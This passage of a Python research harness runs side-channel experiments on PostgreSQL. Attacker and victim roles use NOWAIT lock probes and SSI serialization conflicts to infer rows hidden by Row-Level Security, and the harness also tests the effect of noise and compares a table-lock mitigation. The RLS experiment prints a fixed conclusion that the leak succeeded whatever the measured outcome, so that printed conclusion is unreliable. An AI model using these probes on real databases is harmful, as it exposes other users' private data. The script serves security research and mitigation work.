      Row 2: account_id=2, order_id=12, balance=200  -> SHARED (pivot row)
      Row 3: account_id=3, order_id=13, balance=300  -> Visible ONLY to attacker
      Row 4: account_id=4, order_id=14, balance=400  -> SHARED
    """
    with connect(autocommit=True) as conn:
        conn.execute(f"""
            DO $$
            BEGIN
                IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = '{RLS_VICTIM_ROLE}') THEN
                    CREATE ROLE {RLS_VICTIM_ROLE};
                END IF;
                IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = '{RLS_ATTACKER_ROLE}') THEN
                    CREATE ROLE {RLS_ATTACKER_ROLE};
                END IF;
            END
            $$;
        """)
        conn.execute(f"GRANT {RLS_VICTIM_ROLE} TO CURRENT_USER")
        conn.execute(f"GRANT {RLS_ATTACKER_ROLE} TO CURRENT_USER")
        conn.execute(f"GRANT USAGE ON SCHEMA public TO {RLS_VICTIM_ROLE}, {RLS_ATTACKER_ROLE}")

        conn.execute(f"DROP TABLE IF EXISTS {RLS_TABLE} CASCADE")
        conn.execute(f"""
            CREATE TABLE {RLS_TABLE} (
                account_id INT PRIMARY KEY,
                order_id   INT NOT NULL,
                balance    NUMERIC NOT NULL
            )
        """)
        conn.execute(f"CREATE INDEX {RLS_TABLE}_order_idx ON {RLS_TABLE}(order_id)")

        conn.execute(f"""
            INSERT INTO {RLS_TABLE} (account_id, order_id, balance) VALUES
            (1, 11, 100),
            (2, 12, 200),
            (3, 13, 300),
            (4, 14, 400)
        """)

        conn.execute(f"ALTER TABLE {RLS_TABLE} ENABLE ROW LEVEL SECURITY")
        conn.execute(f"GRANT ALL ON TABLE {RLS_TABLE} TO {RLS_VICTIM_ROLE}, {RLS_ATTACKER_ROLE}")

        conn.execute(f"""
            CREATE POLICY victim_policy ON {RLS_TABLE}
            FOR ALL TO {RLS_VICTIM_ROLE}
            USING (account_id IN (1, 2, 4))
            WITH CHECK (account_id IN (1, 2, 4))
        """)

        conn.execute(f"""
            CREATE POLICY attacker_policy ON {RLS_TABLE}
            FOR ALL TO {RLS_ATTACKER_ROLE}
            USING (account_id IN (2, 3, 4))
            WITH CHECK (account_id IN (2, 3, 4))
        """)
    print(f"[setup] RLS table '{RLS_TABLE}' configured with victim and attacker policies.")


def _probe_rls_ssi(victim_lo: int, victim_hi: int, candidate_order_id: int) -> bool:
    """
    Tests whether an attacker can detect if candidate_order_id falls into the victim's
    private query range [victim_lo, victim_hi], even if the range covers rows hidden by RLS.

    Returns True if a serialization conflict (SQLSTATE 40001) is observed.
    """
    outcome = {"victim_failed": False, "attacker_failed": False}
    barrier = threading.Barrier(2, timeout=10)

    def victim_thread():
        conn = connect(isolation_level=psycopg.IsolationLevel.SERIALIZABLE, role=RLS_VICTIM_ROLE)
        try:
            conn.execute("SET enable_seqscan = off")
            # Step 1: Victim runs predicate query over order_id range (reads row 1 and/or 2)
            conn.execute(
                f"SELECT sum(balance) FROM {RLS_TABLE} WHERE order_id BETWEEN %s AND %s",
                (victim_lo, victim_hi),
            )
            barrier.wait()
            # Step 2: Victim writes to shared pivot row (account_id = 2)
            conn.execute(f"UPDATE {RLS_TABLE} SET balance = balance WHERE account_id = 2")
            conn.commit()
        except pg_errors.SerializationFailure:
            outcome["victim_failed"] = True
            safe_rollback(conn)
        except Exception:
            safe_rollback(conn)
        finally:
            conn.close()

    def attacker_thread():
        conn = connect(isolation_level=psycopg.IsolationLevel.SERIALIZABLE, role=RLS_ATTACKER_ROLE)
        try:
            conn.execute("SET enable_seqscan = off")
            # Step 3: Attacker reads shared pivot row (account_id = 2)
            conn.execute(f"SELECT balance FROM {RLS_TABLE} WHERE account_id = 2")
            barrier.wait()
            # Step 4: Attacker writes guessed candidate_order_id onto their own row (account_id = 3)
            conn.execute(
                f"UPDATE {RLS_TABLE} SET order_id = %s WHERE account_id = 3",
                (candidate_order_id,),
            )
            conn.commit()
        except pg_errors.SerializationFailure:
            outcome["attacker_failed"] = True
            safe_rollback(conn)
        except Exception:
            safe_rollback(conn)
        finally:
            # Restore account_id=3's order_id back to 13
            with connect(autocommit=True) as cleanup_conn:
                cleanup_conn.execute(f"UPDATE {RLS_TABLE} SET order_id = 13 WHERE account_id = 3")
            conn.close()

    t1 = threading.Thread(target=victim_thread)
    t2 = threading.Thread(target=attacker_thread)
    t1.start()
    t2.start()
    t1.join(timeout=10)
    t2.join(timeout=10)

    return outcome["victim_failed"] or outcome["attacker_failed"]


def exp3_1_rls_ssi_leak():
    """
    Experiment 3.1: Row-Level Security (RLS) SSI Predicate Leakage
    -------------------------------------------------------------
    Setup:
      - 4 accounts in scc_rls_orders:
          Row 1 (order 11) -> Private to Victim
          Row 2 (order 12) -> Shared (Pivot row)
          Row 3 (order 13) -> Private to Attacker
          Row 4 (order 14) -> Shared
      - Victim runs a query over order_id BETWEEN 11 AND 12 (touches hidden Row 1).
      - Attacker has NO privilege to read Row 1 (enforced by PostgreSQL RLS).
      - Attacker probes candidate order_ids by updating their own Row 3.

    Question:
      Does PostgreSQL's Serializable Snapshot Isolation (SSI) leak whether
      Row 1 was included in the victim's query, bypassing RLS isolation?
    """
    print("\n=== Experiment 3.1: RLS SSI Predicate Leakage (Shared Pivot Row) ===")
    setup_rls_schema()

    # Verify RLS isolation upfront: Attacker cannot read Row 1
    print("\n[privilege check] Verifying RLS policy enforcement:")
    with connect(autocommit=True, role=RLS_ATTACKER_ROLE) as chk:
        rows = chk.execute(f"SELECT account_id FROM {RLS_TABLE} ORDER BY account_id").fetchall()
        visible_ids = [r[0] for r in rows]
        print(f"  Rows visible to attacker under RLS: {visible_ids}")
        if 1 not in visible_ids:
            print("  -> Confirmed: Row 1 is completely HIDDEN from attacker by RLS.")
        else:
            print("  -> WARNING: Row 1 was unexpectedly visible to attacker!")

    # Victim's secret query range: [11, 12] (covers hidden Row 1 and shared Row 2)
    victim_lo, victim_hi = 11, 12
    print(f"\nVictim's secret range: [{victim_lo}, {victim_hi}] (covers hidden Row 1 [order 11] + shared Row 2 [order 12])")

    candidates = [
        (11, "Matches hidden Row 1 (order 11) - INSIDE victim range"),
        (12, "Matches shared Row 2 (order 12) - INSIDE victim range"),
        (13, "Matches attacker Row 3 (order 13) - OUTSIDE victim range"),
        (14, "Matches shared Row 4 (order 14) - OUTSIDE victim range"),
        (20, "Arbitrary non-existent order - OUTSIDE victim range"),
    ]

    print("\nTesting candidate order_ids probed by attacker:")
    print(f"  {'Candidate':<12} {'Expected In Range?':<22} {'Conflict Observed?':<20} {'Inference'}")
    print("  " + "-" * 75)

    for cand, desc in candidates:
        conflict = _probe_rls_ssi(victim_lo, victim_hi, cand)
        in_range = victim_lo <= cand <= victim_hi
        status = "CONFLICT (40001)" if conflict else "ok (no conflict)"
        inference = "INSIDE victim range" if conflict else "OUTSIDE victim range"
        print(f"  order_id={cand:<4} {str(in_range):<22} {status:<20} -> {inference}")

    print("\nInterpretation:")
    print("  1. When attacker probed order_id = 11, a SERIALIZATION FAILURE (40001) occurred.")
    print("     This confirms order_id 11 was in the victim's active query set.")
    print("  2. Yet, Row 1 (order 11) is STRICTLY FORBIDDEN to the attacker by Row-Level Security!")
    print("  3. Conclusion: SSI predicate locks (SIReadLock) operate at the relation index layer,")
    print("     ignoring RLS boundaries. By pivoting through shared Row 2, the attacker learns")
    print("     that the victim touched private Row 1, successfully leaking across RLS barriers.")

# ---------------------------------------------------------------------------
# EXPERIMENT 4 -- Noise / realism test
# ---------------------------------------------------------------------------
def _background_noise_worker(stop_event: threading.Event):
    """Continuously issues short random-row UPDATEs to simulate an OLTP workload."""
    conn = connect(autocommit=True)
    try:
        while not stop_event.is_set():
            rid = random.randint(1, N_ACCOUNTS)
            try:
                conn.execute(f"UPDATE {TABLE} SET balance = balance WHERE account_id = %s", (rid,))
            except Exception:
                pass
            time.sleep(0.005)
    finally:
        conn.close()


def exp4_noise_realism(n_trials: int = 100, worker_counts=(0, 8, 32), victim_hold_s: float = 0.02):
    """
    Repeats the Experiment-1 oracle test while varying:
      - the number of background noisy clients hammering random rows
      - a SHORT victim lock-hold time (20ms, much more realistic than exp1's
        150ms), to see whether the channel still works when the attacker
        has a much smaller timing window to land a probe in.
    Reports accuracy as a function of background load.
    """
    print("\n=== Experiment 4: Noise / realism test ===")
    reset_data()

    for n_workers in worker_counts:
        stop_event = threading.Event()
        workers = [threading.Thread(target=_background_noise_worker, args=(stop_event,), daemon=True)
                   for _ in range(n_workers)]
        for w in workers:
            w.start()
        time.sleep(0.1)  # let background load ramp up

        tp = tn = fp = fn = 0
        for trial in range(n_trials):
            x = random.randint(1, N_ACCOUNTS)
            is_match = (trial % 2 == 0)
            y = x if is_match else random_other_id(x)

            victim_ready = threading.Event()
            release_victim = threading.Event()

            def victim_thread():
                conn = connect()
                try:
                    conn.execute(f"UPDATE {TABLE} SET balance = balance WHERE account_id = %s", (x,))
                    victim_ready.set()
                    release_victim.wait(timeout=victim_hold_s + 2)
                finally:
                    safe_rollback(conn)
                    conn.close()

            t = threading.Thread(target=victim_thread)
            t.start()
            victim_ready.wait(timeout=2)

            attacker = connect(autocommit=True)
            predicted_conflict = False
            try:
                attacker.execute(f"SELECT 1 FROM {TABLE} WHERE account_id = %s FOR UPDATE NOWAIT", (y,))
            except pg_errors.LockNotAvailable:
                predicted_conflict = True
            except Exception:
                pass  # e.g. a background worker transiently held an unrelated conflicting lock
            finally:
                attacker.close()

            release_victim.set()
            t.join(timeout=victim_hold_s + 2)

            if is_match and predicted_conflict:
                tp += 1
            elif is_match and not predicted_conflict:
                fn += 1
            elif not is_match and predicted_conflict:
                fp += 1
            else:
                tn += 1

        stop_event.set()
        for w in workers:
            w.join(timeout=2)

        total = tp + tn + fp + fn
        accuracy = (tp + tn) / total
        precision = tp / (tp + fp) if (tp + fp) else float("nan")
        recall = tp / (tp + fn) if (tp + fn) else float("nan")
        print(f"background_workers={n_workers:>3}  accuracy={accuracy:.3f}  "
              f"precision={precision:.3f}  recall={recall:.3f}  (n={total})")

    print("Interpretation: watch accuracy as background_workers increases. A sharp drop\n"
          "toward 0.5 shows the channel degrading under realistic contention; accuracy\n"
          "staying high shows it survives real-world noise.")


# ---------------------------------------------------------------------------
# EXPERIMENT 5 -- Observability tiers (what does pg_locks actually show?)
# ---------------------------------------------------------------------------
def exp5_observability_tiers(hold_s: float = 1.0):
    """
    While a victim holds a row lock, a PRIVILEGED observer queries pg_locks
    directly. This demonstrates concretely what is and isn't visible even to
    a fully-privileged observer: Postgres does not enumerate individual
    row-level locks in pg_locks (they're recorded in the tuple header itself,
    not the shared lock table) -- only relation-level and transactionid locks
    show up there. This bounds "Tier 1" of the threat model in practice.
    """
    print("\n=== Experiment 5: Observability tiers (pg_locks visibility) ===")
    reset_data()
    x = 42

    victim_ready = threading.Event()
    release_victim = threading.Event()

    def victim_thread():
        conn = connect()
        try:
            conn.execute(f"UPDATE {TABLE} SET balance = balance WHERE account_id = %s", (x,))
            victim_ready.set()
            release_victim.wait(timeout=hold_s + 5)
        finally:
            safe_rollback(conn)
            conn.close()

    t = threading.Thread(target=victim_thread)
    t.start()
    victim_ready.wait(timeout=5)
    time.sleep(0.05)

    observer = connect(autocommit=True)
    rows = observer.execute(f"""
        SELECT locktype, relation::regclass AS relation, mode, granted, pid
        FROM pg_locks
        WHERE relation = '{TABLE}'::regclass
           OR locktype = 'transactionid'
        ORDER BY locktype
    """).fetchall()
    observer.close()

    release_victim.set()
    t.join(timeout=5)

    print(f"pg_locks rows visible while victim holds a row lock on account_id={x}:")
    for locktype, relation, mode, granted, pid in rows:
        print(f"  locktype={locktype:<14} relation={str(relation):<16} mode={mode:<18} "
              f"granted={granted} pid={pid}")
    print("Note: no row above names account_id=42 directly -- row-level lock state lives\n"
          "in the tuple's xmax, not in the shared lock table, so even a privileged observer\n"
          "reading pg_locks cannot read off *which* row is locked this way.")


# ---------------------------------------------------------------------------
# EXPERIMENT 6 -- Mitigation comparison (coarse-grained locking)
# ---------------------------------------------------------------------------
def exp6_mitigation_comparison(n_trials: int = 60):
    """
    Repeats the Experiment-1 oracle attack twice:
      (a) baseline: victim does a normal row-level UPDATE (fine-grained lock)
      (b) mitigated: victim first takes `LOCK TABLE ... IN EXCLUSIVE MODE`
          before updating, so EVERY row probe conflicts regardless of which
          row the victim actually touched.
    This directly demonstrates the leakage/performance trade-off: mitigation
    (b) should push attacker accuracy down to chance (every guess "conflict")
    while also serializing ALL writes against the table (a concurrency cost
    you'd measure separately with a throughput benchmark).
    """
    print("\n=== Experiment 6: Mitigation comparison (row lock vs. coarse table lock) ===")
    reset_data()

    def run_condition(use_table_lock: bool):
        tp = tn = fp = fn = 0
        for trial in range(n_trials):
            x = random.randint(1, N_ACCOUNTS)
            is_match = (trial % 2 == 0)
            y = x if is_match else random_other_id(x)

            victim_ready = threading.Event()
            release_victim = threading.Event()
            victim_exc = []

            def victim_thread():
                conn = connect(role=VICTIM_ROLE)
                try:
                    if use_table_lock:
                        conn.execute(f"LOCK TABLE {TABLE} IN EXCLUSIVE MODE")
                    conn.execute(f"UPDATE {TABLE} SET balance = balance WHERE account_id = %s", (x,))
                    victim_ready.set()
                    release_victim.wait(timeout=5)
                except Exception as e:
                    victim_exc.append(e)
                finally:
                    safe_rollback(conn)
                    conn.close()

            t = threading.Thread(target=victim_thread)
            t.start()
            if not victim_ready.wait(timeout=3):
                if victim_exc:
                    print(f"    [Trial {trial}] victim_thread failed: {victim_exc[0]}")
                else:
                    print(f"    [Trial {trial}] victim_thread timed out waiting to acquire lock!")

            attacker = connect(autocommit=True, role=ATTACKER_ROLE)
            predicted_conflict = False
            attacker_exc = []
            try:
                # In PostgreSQL, row-level NOWAIT only applies to tuple locks.
                # When a relation-level lock (such as EXCLUSIVE mode) is held,
                # PostgreSQL blocks waiting for the table lock unless lock_timeout is set.
                # Setting lock_timeout ensures table-level conflicts also raise LockNotAvailable (55P03).
                attacker.execute("SET lock_timeout = '100ms'")
                attacker.execute(f"SELECT 1 FROM {TABLE} WHERE account_id = %s FOR UPDATE NOWAIT", (y,))
            except pg_errors.LockNotAvailable:
                predicted_conflict = True
            except Exception as e:
                attacker_exc.append(e)
                print(f"    [Trial {trial}] attacker probe unexpected error: {e}")
            finally:
                attacker.close()

            release_victim.set()
            t.join(timeout=5)

            if is_match and predicted_conflict:
                tp += 1
            elif is_match and not predicted_conflict:
                fn += 1
            elif not is_match and predicted_conflict:
                fp += 1
            else:
                tn += 1
        total = tp + tn + fp + fn
        print(f"    results: TP={tp} TN={tn} FP={fp} FN={fn} (total={total})")
        return (tp + tn) / total, fp, total

    print("  [1/2] Running baseline condition (row-level locks)...", flush=True)
    acc_baseline, fp_baseline, n = run_condition(use_table_lock=False)
    print("  [2/2] Running mitigated condition (coarse table-level lock)...", flush=True)
    acc_mitigated, fp_mitigated, _ = run_condition(use_table_lock=True)

    print(f"baseline (row-level lock):   accuracy={acc_baseline:.3f}  false_positives={fp_baseline}/{n}")
    print(f"mitigated (table-level lock): accuracy={acc_mitigated:.3f}  false_positives={fp_mitigated}/{n}")
    print("Interpretation: under the table-level mitigation, accuracy should collapse toward\n"
          "0.5 (every probe conflicts, so 'conflict' stops predicting 'same row') -- the\n"
          "identity signal is destroyed. The cost (not measured here) is that ALL writes to\n"
          "the table now serialize against each other, which you'd quantify with a separate\n"
          "throughput benchmark (e.g. pgbench) to complete the leakage-vs-performance picture.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
EXPERIMENTS = {
    "1": ("Oracle baseline", exp1_oracle_baseline),
    "1.1": ("Attacker without SELECT (UPDATE-only probe)", exp1_1_update_only_probe),
    "2": ("Lock-mode conflict matrix", exp2_lock_mode_matrix),
    "3": ("SSI predicate-range leak", exp3_ssi_predicate_leak),
    "4": ("Noise / realism test", exp4_noise_realism),
    "5": ("Observability tiers", exp5_observability_tiers),
    "6": ("Mitigation comparison", exp6_mitigation_comparison),
}


def main():
    exp_order = sorted(EXPERIMENTS.keys(), key=lambda k: [float(x) for x in k.split(".")])
    parser = argparse.ArgumentParser(description="Postgres concurrency-control conflict-leakage experiments")
    parser.add_argument("--exp", type=str, nargs="+", choices=exp_order,
                         help="run only these experiment numbers (default: all)")
    parser.add_argument("--quick", action="store_true",
                         help="use smaller trial counts for a fast smoke test")
    args = parser.parse_args()

    print(f"Connecting to: {DSN}")
    try:
        with connect(autocommit=True) as conn:
            conn.execute("SELECT 1")
    except Exception as e:
        print(f"Could not connect to Postgres with DSN '{DSN}': {e}")
        print("Edit the DSN constant at the top of this script, or set the PG_DSN "
              "environment variable, then re-run.")
        return
    print("Connection OK.")

    setup_schema()
    setup_roles_and_privileges()

    to_run = args.exp if args.exp else exp_order
    quick_overrides = {
        "1": dict(n_trials=40),
        "1.1": dict(n_trials=20),
        "3": dict(true_lo=150, true_hi=160, search_max=200),
        "4": dict(n_trials=30, worker_counts=(0, 8)),
        "6": dict(n_trials=20),
    }

    for num in to_run:
        name, fn = EXPERIMENTS[num]
        kwargs = quick_overrides.get(num, {}) if args.quick else {}
        fn(**kwargs)

    print("\nAll requested experiments complete.")


if __name__ == "__main__":
    main()
